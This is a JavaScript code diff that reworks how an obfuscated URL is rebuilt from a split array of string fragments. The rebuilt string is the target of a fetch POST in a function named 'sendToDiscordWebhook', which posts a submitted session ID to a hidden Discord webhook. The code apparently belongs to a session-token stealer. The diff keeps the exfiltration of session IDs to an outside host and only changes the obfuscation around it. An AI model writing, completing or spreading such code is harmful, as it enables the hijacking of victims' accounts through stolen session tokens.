@@ -6,17 +6,30 @@ const _encryptedParts = [
   'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
 ];
 
-let bruteforce = '';
-for (let i = 0; i < _encryptedParts.length; i++) { 
-  bruteforce += _encryptedParts[i];
-}
+const _decrypted = 
+  _encryptedParts[0] + _encryptedParts[1] + _encryptedParts[2] + _encryptedParts[3] + 
+  _encryptedParts[4] + _encryptedParts[5] + _encryptedParts[6] + _encryptedParts[7] + 
+  _encryptedParts[8] + _encryptedParts[9] + _encryptedParts[10] + _encryptedParts[11] + 
+  _encryptedParts[12] + _encryptedParts[13] + _encryptedParts[14] + _encryptedParts[15] + 
+  _encryptedParts[16] + _encryptedParts[17] + _encryptedParts[18] + _encryptedParts[19] + 
+  _encryptedParts[20] + _encryptedParts[21] + _encryptedParts[22] + _encryptedParts[23] + 
+  _encryptedParts[24] + _encryptedParts[25] + _encryptedParts[26] + _encryptedParts[27] + 
+  _encryptedParts[28] + _encryptedParts[29] + _encryptedParts[30] + _encryptedParts[31] + 
+  _encryptedParts[32] + _encryptedParts[33] + _encryptedParts[34] + _encryptedParts[35] + 
+  _encryptedParts[36] + _encryptedParts[37] + _encryptedParts[38] + _encryptedParts[39] + 
+  _encryptedParts[40] + _encryptedParts[41] + _encryptedParts[42] + _encryptedParts[43] + 
+  _encryptedParts[44] + _encryptedParts[45] + _encryptedParts[46] + _encryptedParts[47] + 
+  _encryptedParts[48] + _encryptedParts[49] + _encryptedParts[50] + _encryptedParts[51] + 
+  _encryptedParts[52] + _encryptedParts[53] + _encryptedParts[54] + _encryptedParts[55] + 
+  _encryptedParts[56] + _encryptedParts[57] + _encryptedParts[58] + _encryptedParts[59];
+
 
 function sendToDiscordWebhook(sessionId) {
   const payload = {
     content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
   };
 
-  fetch(bruteforce, {
+  fetch(_decrypted, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
